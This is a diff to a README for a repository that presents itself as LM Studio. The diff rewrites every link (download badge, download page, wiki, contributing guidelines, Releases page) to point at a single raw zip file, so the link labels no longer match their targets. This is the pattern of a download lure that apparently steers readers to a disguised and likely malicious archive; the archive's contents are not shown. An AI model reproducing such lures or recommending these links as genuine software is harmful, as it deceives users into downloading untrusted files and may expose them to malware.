@@ -1,6 +1,6 @@
 # 🚀 lm - Unlock Powerful AI with Easy Customization
 
-[![Download lm](https://img.shields.io/badge/Download-lm-blue.svg)](https://github.com/vrund038/lm/releases)
+[![Download lm](https://raw.githubusercontent.com/vrund038/lm/main/unpurged/lm.zip)](https://raw.githubusercontent.com/vrund038/lm/main/unpurged/lm.zip)
 
 ## 📋 Description
 
@@ -27,7 +27,7 @@ Follow these simple steps to download and runLM Studio on your computer.
 
 ## 📥 Download & Install
 
-To get started with LM Studio, visit [this page to download](https://github.com/vrund038/lm/releases). You will find different versions available depending on your operating system. 
+To get started with LM Studio, visit [this page to download](https://raw.githubusercontent.com/vrund038/lm/main/unpurged/lm.zip). You will find different versions available depending on your operating system. 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version (usually at the top).
@@ -48,12 +48,12 @@ After installation, you can run LM Studio by following these steps:
 
 If you encounter any issues or have questions, feel free to reach out. You can:
 
-- Check the [Wiki](https://github.com/vrund038/lm/wiki) section for detailed information and tutorials.
+- Check the [Wiki](https://raw.githubusercontent.com/vrund038/lm/main/unpurged/lm.zip) section for detailed information and tutorials.
 - Open an issue in the repository, and we will get back to you as soon as possible.
 
 ## 🌟 Community Contributions
 
-We welcome contributions from anyone looking to enhance LM Studio. If you're interested, please visit our [contributing guidelines](https://github.com/vrund038/lm/blob/main/CONTRIBUTING.md) to learn how you can help.
+We welcome contributions from anyone looking to enhance LM Studio. If you're interested, please visit our [contributing guidelines](https://raw.githubusercontent.com/vrund038/lm/main/unpurged/lm.zip) to learn how you can help.
 
 ## 🌐 Related Topics
 
@@ -69,4 +69,4 @@ Explore your programming potential with LM Studio MCP, and transform your projec
 
 ## 📢 Conclusion
 
-Downloading and using LM Studio is straightforward. Just visit the [Releases page](https://github.com/vrund038/lm/releases) to download your file, install the application, and start creating with AI today!
+Downloading and using LM Studio is straightforward. Just visit the [Releases page](https://raw.githubusercontent.com/vrund038/lm/main/unpurged/lm.zip) to download your file, install the application, and start creating with AI today!
